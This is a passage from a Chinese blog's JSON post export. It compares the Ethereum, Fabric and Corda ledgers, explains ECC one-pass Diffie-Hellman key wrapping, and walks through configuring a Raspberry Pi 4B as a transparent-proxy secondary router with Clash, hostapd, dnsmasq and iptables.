</p>\n<p>交易唯一性涉及交易的输入状态。具体而言，必须确保有疑问的交易是所有输入状态的唯一消费者。换句话说，不存在任何消耗同一状态的其它交易。这是为了避免产生双重支付。</p>\n<p>实现交易唯一性的共识，是在称为“<strong>公证人</strong>”（Notary）的参与节点中达成的。其中使用的算法和Fabric一样，是“可插拔的”。因此，我们同样可以使用 BFT 算法。</p>\n<h2 id=\"内建代币\"><a href=\"#内建代币\" class=\"headerlink\" title=\"内建代币\"></a>内建代币</h2><p>在区块链技术的应用上，有“币圈”和“链圈”的说法，当然从技术层面，我们并不关心数字货币的炒作，但其中也可能涉及内建代币。</p>\n<p>以太坊提供一种称为“<strong>以太</strong>（Ether）”的内置加密货币。以太用于向帮助通过挖矿达成共识的节点支付奖励，并支付交易费用。因此，去中心化应用（DApps）可以基于支持货币交易的以太坊构建。此外，通过部署符合预定义标准的智能合约，可以创建为用例定制的数字代币。使用这种方式，人们可以定义自己的货币或资产。</p>\n<p>Fabric 和 Corda 不支持通过挖矿达成共识，因此不需要内建的加密货币。但是使用Fabric，也可以开发本地货币，或是带有区块链代码的数字代币，例如Libra。使用 Corda，不建议创建数字货币或代币。</p>\n<h2 id=\"智能合约\"><a href=\"#智能合约\" class=\"headerlink\" title=\"智能合约\"></a>智能合约</h2><p>在第一次接触“智能合约”（smart contract）一词时，人们难免会产生相当大的误解，将其理解为某种智能地表达了某人利益的合约。尽管合约的本质仍然存在含糊不清之处，但是在直观上它似乎应与法律有关。也就是说，我们所关注的合约在本意上并非智能的，至少目前仍尚未由人工智能驱动，也尚未在其中编入具有法律约束力的义务和权利。</p>\n<p>Clark 及其同事在给出“智能合约”这一有用术语时，强调指出了该术语的两种不同的常用方式。第一种方式是智能合约代码（smart contract code），另一种方式是智能法律合约（smart legal contracts）。</p>\n<h3 id=\"以太坊-1\"><a href=\"#以太坊-1\" class=\"headerlink\" title=\"以太坊\"></a>以太坊</h3><p>智能合约代码就是用某种编程语言编写的软件。它作为一个软件代理，或是代表其中某一方，目的是履行某些义务、行使某些权利，并以自动的方式控制分布式账本中的资产。因此，智能合约通过代码执行模拟，或模拟现实世界中合约逻辑，承担了分布式账本的任务和责任，尽管其合法性可能尚未明确。</p>\n<p>所有的DLT都支持以智能合约代码的形式履行智能合约。代码可以使用Go、Java for Fabric、Solidity for Ethereum，以及Java&#x2F;Kotlin for Corda 编写。</p>\n<h3 id=\"Fabric-2\"><a href=\"#Fabric-2\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>在Fabirc中使用了术语“<strong>链码</strong>”（chaincode），以此作为智能合约的同义词。</p>\n<h3 id=\"Corda-2\"><a href=\"#Corda-2\" class=\"headerlink\" title=\"Corda\"></a>Corda</h3><p>Corda为确保交易的有效性，会提醒读者在共识机制中使用智能合同代码。同时，Corda的智能合约不仅可以包含代码，还允许包含法律行文（Legal Prose）。因此，上述智能法律合约是法律行文，其制定方式可以通过智能合同代码来表达和实施。</p>\n<p>其背后的基本原理，是赋予植根于相关法律行为的代码以合法性。这种结构称为“Ricardian 合约”。这清晰地表明，Corda 是设计用于金融服务行业这一受严格监管的环境。而 Fabric 和 Ethereum 都不具备此功能。</p>\n<hr>\n<h2 id=\"总结：定制平台-Vs-通用平台\"><a href=\"#总结：定制平台-Vs-通用平台\" class=\"headerlink\" title=\"总结：定制平台 Vs 通用平台\"></a>总结：定制平台 Vs 通用平台</h2><h3 id=\"1-以太坊\"><a href=\"#1-以太坊\" class=\"headerlink\" title=\"1.以太坊\"></a>1.以太坊</h3><p>以太坊是一种强大的智能合约引擎，基本上可作为任何类型应用的通用平台。<br>但是，以太坊的无授权操作模式及全面透明度，是以牺牲性能可扩展性和隐私性为代价的。</p>\n<h3 id=\"2-Fabric\"><a href=\"#2-Fabric\" class=\"headerlink\" title=\"2.Fabric\"></a>2.Fabric</h3><p>Fabric采用有授权的操作模式，即使用 BFT 算法和细粒度访问控制解决了性能可扩展性和隐私问题。<br>此外，Fabric的模块化体系结构使其可以针对众多应用进行定制。我们可将 Fabric 比做一个多功能的工具箱。</p>\n<h3 id=\"3-Corda\"><a href=\"#3-Corda\" class=\"headerlink\" title=\"3.Corda\"></a>3.Corda</h3><p>Corda被设计为一种专门用于金融服务行业的DLT，专注于金融服务交易使Corda得以简化其架构设计，因此Corda可以提供更多的开箱即可用体验。</p>\n<p>值得注意的是，Corda通过增加法律行文的智能合同，考虑了受高度管制的环境。</p>\n<p>不过，Fabric的模块化支持定制类似于Corda的功能集，一些工作力图将Corda纳入Hyperledger项目。因此，不能将Corda视为Fabric的竞争对手，而更多的是一种补充。</p>\n"},{"title":"基于椭圆曲线的ECC非对称密码系统","url":"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/","content":"<h2 id=\"附录一：一次性迪菲-赫尔曼密钥交换协议\"><a href=\"#附录一：一次性迪菲-赫尔曼密钥交换协议\" class=\"headerlink\" title=\"附录一：一次性迪菲-赫尔曼密钥交换协议\"></a>附录一：一次性迪菲-赫尔曼密钥交换协议</h2><p>一次性迪菲-赫尔曼密钥交换协议（One-Pass Diffie-Hellman Key Agreement），定义在 <a href=\"NIST.SP.800-56Ar2.pdf\">NISP SP 800-56A</a> 的 6.2.2.2 章节，名称为<code>One-Pass Diffie-Hellman, C(1e,1s,ECC CDH) Scheme</code>，含义是：</p>\n<ul>\n<li>密钥交换通过一次性的DH（Diffie-Hellman）协议，C 是指协因子（Cofactor）</li>\n<li>使用了1个临时密钥，1个静态密钥</li>\n<li>加密算法是椭圆曲线加密算法 ECC（Elliptic Curve Cryptography）</li>\n</ul>\n<blockquote>\n<p>DH 协议最初采用 FFC 算法（Finite Field Cryptography，有限域加密），也称为幂等算法，安全强度较低<br>Curve 25519 使用蒙哥马利曲线，y<sup>2</sup> &#x3D; x<sup>3</sup> + 486662x<sup>2</sup> + x<br>该曲线定义在由素数定义的素数场的二次扩展上，使用基点x &#x3D; 9<br>这个基点的阶数是<br>其构造不受定时攻击的影响，接受任何32字节的字符串作为有效的公钥，且无需验证<br>蒙哥马利曲线（Montgomery curve）是另一种形式的椭圆曲线，方程如下：</p>\n</blockquote>\n<p><img src=\"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/onePassECCCDH.png\" alt=\"onePassECCCDH\"></p>\n<p>素数域p &#x3D; 2^{255}-19，也是名字中25519的由来。</p>\n<ul>\n<li>p &#x3D; 2<sup>255</sup> − 19</li>\n<li>域空间大小：q &#x3D; </li>\n<li>FR &#x3D;</li>\n<li>参数：a &#x3D; 486662</li>\n<li>参数：b &#x3D; 1</li>\n<li>初始值（可选）：SEED &#x3D; N&#x2F;A</li>\n<li>生成元：G &#x3D; </li>\n<li>辅因子：h &#x3D; 8</li>\n<li>阶数（群秩）：n &#x3D; 2<sup>252</sup>+27742317777372353535851937790883648493</li>\n</ul>\n<p>对于<code>Protected Unless Open</code>的文件保护类型，分析其实现方案是：</p>\n<h3 id=\"1-初始化存储介质的环节\"><a href=\"#1-初始化存储介质的环节\" class=\"headerlink\" title=\"1. 初始化存储介质的环节\"></a>1. 初始化存储介质的环节</h3><ul>\n<li>安全隔区随机生成一对非对称密钥（静态）</li>\n<li>静态私钥就是 Class B Key，包裹后的密文<strong>持久化存储</strong>在系统密钥包</li>\n</ul>\n<h3 id=\"2-（某个）文件创建的环节\"><a href=\"#2-（某个）文件创建的环节\" class=\"headerlink\" title=\"2.（某个）文件创建的环节\"></a>2.（某个）文件创建的环节</h3><ul>\n<li>安全隔区随机生成一个文件独有密钥 per-file key</li>\n<li>安全隔区随机生成一对非对称密钥（临时），封装密钥 &#x3D;（静态私钥，临时公钥），生成 per-file key！</li>\n<li>安全隔区将（临时公钥，per-file key！）发给操作系统</li>\n<li>操作系统创建 cnode 元数据，持久化存储 per-file key!，并增加了一个字段存储临时公钥</li>\n<li>安全隔区将 per-file key 发给 AES 引擎，实现文件内容的加密存储</li>\n</ul>\n<blockquote>\n<p>临时私钥从为被使用？好像没有哪个文档提及其用途</p>\n</blockquote>\n<h3 id=\"3-（重新）打开文件的环节\"><a href=\"#3-（重新）打开文件的环节\" class=\"headerlink\" title=\"3.（重新）打开文件的环节\"></a>3.（重新）打开文件的环节</h3><ul>\n<li>操作系统作从文件元数据中获得（临时公钥，per-file key！），并发送给安全隔区</li>\n<li>安全隔区以 Class B key 作为静态私钥，解封密钥 &#x3D;（静态私钥，临时公钥），将 per-file key！解封为 per-file key</li>\n<li>安全隔区将 per-file key 发给 AES 引擎，实现文件内容的加密读写</li>\n<li>一旦该文件被关闭，安全隔区就在内存中丢弃 per-file key，该文件将无法读写</li>\n</ul>\n<h3 id=\"4-用户重置passcode\"><a href=\"#4-用户重置passcode\" class=\"headerlink\" title=\"4. 用户重置passcode\"></a>4. 用户重置passcode</h3><p>理论上应有如下操作：</p>\n<ol>\n<li>根据新的 passcode 重新执行 KDF 函数，生成新的 Class B key</li>\n<li>找到所有数据保护类型为 Class B 的文件元数据，执行如下循环操作：<ul>\n<li>解封密钥 &#x3D;（旧的静态私钥，临时公钥），将 per-file key！恢复为 per-file key</li>\n<li>封装密钥 &#x3D;（新的静态私钥，临时公钥），将 per-file key 封装为新的 per-file key！</li>\n<li>操作系统接受新的 per-file key！，并持久化存储在元数据 cnode 的 cprotect 字段</li>\n</ul>\n</li>\n<li>循环结束后，将新的 Class B key 持久化存储在系统钥匙包</li>\n</ol>\n<blockquote>\n<p>静态私钥保存在 Class B key，但没有文档提及其用途和持久化存储位置，似乎被丢弃了<br>临时私钥的情况也是类似，而且似乎丢弃了也不影响算法的实现。。。</p>\n</blockquote>\n<p><img src=\"/2022/11/28/%E5%9F%BA%E4%BA%8E%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%9A%84ECC%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/onePassECCCDH-2.png\" alt=\"onePassECCCDH\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.desmos.com/calculator/ialhd71we3?lang=zh-CN\">一个椭圆曲线的演示图</a></li>\n<li><a href=\"https://learnblockchain.cn/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6\">区块链中的数学 - 系列文章</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"NIST.SP.800-56Ar3.pdf\">基于离散对数的非对称密钥建立方案 - R3</a></li>\n<li><a href=\"NIST.SP.800-56Ar2.pdf\">基于离散对数的非对称密钥建立方案 - R2</a></li>\n<li><a href=\"190902-intro-x25519.pdf\">深入理解 X25519</a></li>\n<li><a href=\"sec1-v1.99.dif\">Elliptic Curve Cryptography - 椭圆曲线密码学</a></li>\n</ul>\n"},{"title":"基于树莓派4B构建支持透明代理的辅助路由器","url":"/2020/07/21/%E5%9F%BA%E4%BA%8E%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%9E%84%E5%BB%BA%E6%94%AF%E6%8C%81%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E7%9A%84%E8%BE%85%E5%8A%A9%E8%B7%AF%E7%94%B1%E5%99%A8/","content":"<h2 id=\"基础环境\"><a href=\"#基础环境\" class=\"headerlink\" title=\"基础环境\"></a>基础环境</h2><ul>\n<li>Raspberry Lite OS：   基于ARM V7，32位操作系统</li>\n<li>dnsmasq： 自建域名服务器 + DHCP服务器， 192.168.0.8</li>\n<li>hostapd： 提供AP服务器，SSID&#x3D;xxx-PI， 192.168.11.x&#x2F;24</li>\n<li>clash：   作为v2ray节点的客户端，自带Dashboard</li>\n</ul>\n<p>主路由器： 192.168.0.1</p>\n<p>从路由器：<br>    - eth0： 192.168.0.8<br>    - waln0：192.168.11.1<br>    - DHCP Range： 192.168.11.100-150<br>    - DHCP Default Gateway: 192.168.11.1</p>\n<p>Clash：<br>    - 7890: http&#x2F;https代理端口<br>    - 7891: socks5代理端口<br>    - 7892: 流量重定向端口<br>    - 9090: Dashboard端口<br>    - 53:   内建DNS端口（UDP）</p>\n<p>Clash控制面板：<a href=\"http://192.168.0.8:9090/ui\">http://192.168.0.8:9090/ui</a></p>\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><h3 id=\"一、安装树莓派并启动\"><a href=\"#一、安装树莓派并启动\" class=\"headerlink\" title=\"一、安装树莓派并启动\"></a>一、安装树莓派并启动</h3><p><strong>Raspbian</strong>是树莓派的官方操作系统，是官基于Debain的深度定制，软件升级策略偏保守，强调稳定第一。<br>桌面版下载链接：<a href=\"http://downloads.raspberrypi.org/raspbian_latest\">http://downloads.raspberrypi.org/raspbian_latest</a><br>Lite 版（无桌面）下载链接：<a href=\"https://downloads.raspberrypi.org/raspbian_lite_latest\">https://downloads.raspberrypi.org/raspbian_lite_latest</a></p>\n<p>树莓派4B的BCM2711芯片采用四核Cortex A72架构，28nm工艺，主频1.5GHz，GPU 500MHz，因此是<code>armv7</code>的技术架构，32位操作系统。<br>虽然树莓派4B宣称已支持64位操作系统，但还在测试阶段；也可以采用Ubuntu、Centos等第三方系统，但软件依赖还是比较麻烦，因此本次安装采用的是Raspberry Lite OS，下载镜像文件是：<code>2020-05-27-raspios-buster-lite-armhf.img</code>。</p>\n<p>采用<strong>Etcher</strong>刻录CF卡，将写好的CF卡插入树莓派，连接有线网卡并加电后，就可以正常启动了。</p>\n<blockquote>\n<p>为避免安全问题，Raspberry OS默认关闭了ssh登录。解决方法是：在烧录SD卡成功后，手工mount并在根目录下touch一个空文件，名称是ssh</p>\n</blockquote>\n<p>树莓派首次启动时，默认采用DHCP方式获取IP地址，在接入路由器上找到相应IP地址，通过ssh远程登录。<br>默认帐号：Username: pi Password: raspberry<br>当然，如果连接了显示器和键盘，就不需要处理ssh登录的问题了。</p>\n<h3 id=\"二、设置树莓派的运行环境\"><a href=\"#二、设置树莓派的运行环境\" class=\"headerlink\" title=\"二、设置树莓派的运行环境\"></a>二、设置树莓派的运行环境</h3><ol>\n<li><p>设置网络参数，并重新启动</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 激活无线网卡</span></span><br><span class=\"line\">sudo rfkill unblock wlan</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置两张网卡的网络参数</span></span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/network/interfaces &gt; /dev/null &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">auto lo</span></span><br><span class=\"line\"><span class=\"string\">iface lo inet loopback</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">auto eth0</span></span><br><span class=\"line\"><span class=\"string\">iface eth0 inet static</span></span><br><span class=\"line\"><span class=\"string\">address 192.168.0.8</span></span><br><span class=\"line\"><span class=\"string\">netmask 255.255.255.0</span></span><br><span class=\"line\"><span class=\"string\">gateway 192.168.0.1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">allow-hotplug wlan0</span></span><br><span class=\"line\"><span class=\"string\">iface wlan0 inet static</span></span><br><span class=\"line\"><span class=\"string\">address 192.168.11.1</span></span><br><span class=\"line\"><span class=\"string\">netmask 255.255.255.0</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p> 网络参数设置成功后，使用<code>sudo reboot</code>重启树莓派。<br> 以<code>ssh pi@192.168.0.8</code>从新的IP地址登录，并使用<code>ip a</code>检查网络情况，如果获得以下输出就OK了！</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether dc:a6:32:ad:ad:78 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.8/24 brd 192.168.0.255 scope global eth0</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::dea6:32ff:fead:ad78/64 scope <span class=\"built_in\">link</span></span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether dc:a6:32:ad:ad:79 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.11.1/24 brd 192.168.11.255 scope global wlan0</span><br><span class=\"line\">    valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置软件源，并安装基础软件</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭默认源</span></span><br><span class=\"line\">sudo sed -i <span class=\"string\">&#x27;s/^deb http/#deb http/g&#x27;</span> /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置Aliyun国内源</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;echo &quot;deb https://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list&#x27;</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;echo &quot;deb-src https://mirrors.aliyun.com/raspbian/raspbian/ buster main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新源仓库，并安装基础软件</span></span><br><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install net-tools dnsutils ntp hostapd git iptables-persistent netfilter-persistent dnsmasq -y</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>基础软件安装都在此步骤完成！！！ 因为后续启动Clash内建DNS，将域名解析到伪地址，会影响本机Terminal的外网访问</li>\n</ul>\n</blockquote>\n</li>\n<li><p>关闭不需要的Systemd自启动服务</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭avahi自动网络发现功能，类似Bonjure</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">disable</span> avahi-daemon</span><br><span class=\"line\">sudo systemctl stop avahi-daemon</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 暂时关闭dnsmasq服务，避免影响Clash安装</span></span><br><span class=\"line\">sudo systemctl stop dnsmasq</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>dsnmasq安装时会自动修改&#x2F;etc&#x2F;resolv.conf，将默认DNS修改为127.0.0.1</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"三、安装并设置Clash\"><a href=\"#三、安装并设置Clash\" class=\"headerlink\" title=\"三、安装并设置Clash\"></a>三、安装并设置Clash</h3><p>Clash的Github地址是<a href=\"https://github.com/Dreamacro/clash\">https://github.com/Dreamacro/clash</a>, 技术文档位于<a href=\"https://lancellc.gitbook.io/clash/clash-config-file/an-example-configuration-file\">https://lancellc.gitbook.io/clash</a></p>\n<p>基于众所周知的原因，建议采用手工下载并通过sftp传入树莓派，主要包括以下文件：</p>\n<table>\n<thead>\n<tr>\n<th>文件名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>clash-linux-armv7-v1.0.0.gz</td>\n<td>clash的可执行文件</td>\n</tr>\n<tr>\n<td>Country.mmdb</td>\n<td>各个国家的IP地址数据文件, clash启动时会自动下载</td>\n</tr>\n<tr>\n<td>yacd-gh-pages.zip</td>\n<td>第三方控制面板插件，比官方的好看一些</td>\n</tr>\n<tr>\n<td>config.yaml</td>\n<td>VPS客户端的配置文件</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p>传入文件默认存放在<code>/home/pi/</code>，解压并手工安装</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 建立clash的home目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> <span class=\"variable\">$HOME</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> .config</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> .config/clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置/usr/bin/clash，并添加绑定低位端口的权限</span></span><br><span class=\"line\">sudo gunzip clash-linux-armv7-v1.0.0.gz</span><br><span class=\"line\"></span><br><span class=\"line\">sudo <span class=\"built_in\">mv</span> clash-linux-armv7-v1.0.0 /usr/bin/clash</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> a+x /usr/bin/clash</span><br><span class=\"line\">sudo <span class=\"built_in\">setcap</span> cap_net_bind_service=+ep /usr/bin/clash</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /usr/bin/clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装配置文件</span></span><br><span class=\"line\">unzip yacd-gh-pages.zip</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> yacd-gh-pages /home/pi/.config/clash/yacd-dashboard</span><br><span class=\"line\"><span class=\"built_in\">mv</span> Country.mmdb /home/pi/.config/clash/</span><br><span class=\"line\"><span class=\"built_in\">mv</span> config.yaml /home/pi/.config/clash/</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /home/pi/.config/clash/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo clash -d /home/pi/.config/clash</code>，启动clash</p>\n<p> 正常情况下屏幕将显示如下内容，就表示启动成功并打开了相应的侦听端口</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~/.config/clash $ sudo clash -d /home/pi/.config/clash</span><br><span class=\"line\">INFO[0000] Start initial compatible provider auto</span><br><span class=\"line\">INFO[0000] Start initial compatible provider Proxy</span><br><span class=\"line\">INFO[0000] HTTP proxy listening at: :7890</span><br><span class=\"line\">INFO[0000] SOCKS proxy listening at: :7891</span><br><span class=\"line\">INFO[0000] DNS server listening at: 0.0.0.0:53</span><br><span class=\"line\">INFO[0000] Redir proxy listening at: :7892</span><br><span class=\"line\">INFO[0000] RESTful API listening at: 0.0.0.0:9090</span><br></pre></td></tr></table></figure>\n\n<p> 也可以自行检查端口占用情况</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ sudo netstat -tunpl |grep clash</span><br><span class=\"line\">tcp6       0      0 :::7890                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::7891                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::7892                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">tcp6       0      0 :::9090                 :::*                    LISTEN      3001/clash</span><br><span class=\"line\">udp6       0      0 :::53                   :::*                                3001/clash</span><br><span class=\"line\">udp6       0      0 :::7891                 :::*                                3001/clash</span><br><span class=\"line\">udp6       0      0 :::7892                 :::*                                3001/clash  </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>vmess等协议对Server和CLient的时钟同步有严格要求，如果没有NTP服务，可能导致无法连通</p>\n</blockquote>\n</li>\n<li><p>输入<code>curl -x http://localhost:7890 google.com</code>, 检查KX上网的效果</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ curl -x http://localhost:7890 google.com</span><br><span class=\"line\">&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class=\"line\">&lt;TITLE&gt;301 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;</span><br><span class=\"line\">&lt;H1&gt;301 Moved&lt;/H1&gt;</span><br><span class=\"line\">The document has moved</span><br><span class=\"line\">&lt;A HREF=&quot;http://www.google.com/&quot;&gt;here&lt;/A&gt;.</span><br><span class=\"line\">&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>浏览器输入地址<code>http://192.168.0.8:9090/ui</code>，打开控制面板</p>\n</li>\n</ol>\n<img src=\"/2020/07/21/%E5%9F%BA%E4%BA%8E%E6%A0%91%E8%8E%93%E6%B4%BE4B%E6%9E%84%E5%BB%BA%E6%94%AF%E6%8C%81%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E7%9A%84%E8%BE%85%E5%8A%A9%E8%B7%AF%E7%94%B1%E5%99%A8/dashboard-1.png\" class=\"\">\n\n<h3 id=\"四、配置并启动AP热点\"><a href=\"#四、配置并启动AP热点\" class=\"headerlink\" title=\"四、配置并启动AP热点\"></a>四、配置并启动AP热点</h3><ol>\n<li><p>输入<code>sudo vi /etc/dnsmasq.conf</code>， 也可以根据本次环境自行修改网络参数</p>\n<blockquote>\n<p>注意：dnsmasq仅作为DHCP服务器，不启动DNS，因为Clash有自建的DNS</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># DHCP</span><br><span class=\"line\">interface=wlan0</span><br><span class=\"line\">listen-address=192.168.11.1</span><br><span class=\"line\">dhcp-range=192.168.11.100, 192.168.11.150, 12h</span><br><span class=\"line\"></span><br><span class=\"line\"># set default route</span><br><span class=\"line\">dhcp-option=3,192.168.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"># set default nameserver</span><br><span class=\"line\">dhcp-option=6, 192.168.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"># without DNS</span><br><span class=\"line\">port=0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo vi /etc/default/hostapd</code>, 设置hostapd启动配置文件。<br> 将其中包含<code>#DAEMON_CONF=&quot;&quot;</code>的行，修改为</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入<code>sudo vi /etc/hostapd/hostapd.conf</code>， 根据本地网络环境自行修改配置AP接入参数</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface=wlan0</span><br><span class=\"line\">driver=nl80211</span><br><span class=\"line\">hw_mode=g</span><br><span class=\"line\">ssid=&lt; Your SSID &gt;</span><br><span class=\"line\">channel=6</span><br><span class=\"line\">wpa=2</span><br><span class=\"line\">wpa_passphrase=&lt; Your Passeword &gt;</span><br><span class=\"line\">wpa_key_mgmt=WPA-PSK</span><br><span class=\"line\">wpa_pairwise=CCMP</span><br><span class=\"line\">rsn_pairwise=CCMP</span><br><span class=\"line\">auth_algs=3</span><br><span class=\"line\">wmm_enabled=1</span><br><span class=\"line\">max_num_sta=10</span><br><span class=\"line\">logger_stdout=-1</span><br><span class=\"line\">logger_stdout_level=2</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：将<code>&lt; Your SSID &gt;</code> 和 <code>&lt; Your Passeword &gt;</code> 修改为用户定义数据</p>\n</blockquote>\n</li>\n<li><p>通过systemd，启动AP热点</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># hostapd启动解锁</span></span><br><span class=\"line\">sudo systemctl unmask hostapd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重启服务</span></span><br><span class=\"line\">sudo systemctl restart hostapd</span><br><span class=\"line\">sudo systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>\n\n<p> 启动完成后，另外找一台PC设备，寻找SSID并连接登录，此时应该分配一个<code>198.168.11.x</code>的地址。<br> 检查该PC的网络参数，默认路由是<code>192.168.11.1</code>，DNS设置为<code>198.19.0.1</code>，但是并不能上网(DNS是个fake-ip的假地址)，因为下面还有一个关键步骤。</p>\n</li>\n</ol>\n<h3 id=\"五、为从路由器设置透明代理\"><a href=\"#五、为从路由器设置透明代理\" class=\"headerlink\" title=\"五、为从路由器设置透明代理\"></a>五、为从路由器设置透明代理</h3><ol>\n<li><p>为AP热点设置动态NAT转发，只出不进</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 为 wlan0---&gt;eth0 设置动态NAT出口转换</span></span><br><span class=\"line\">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  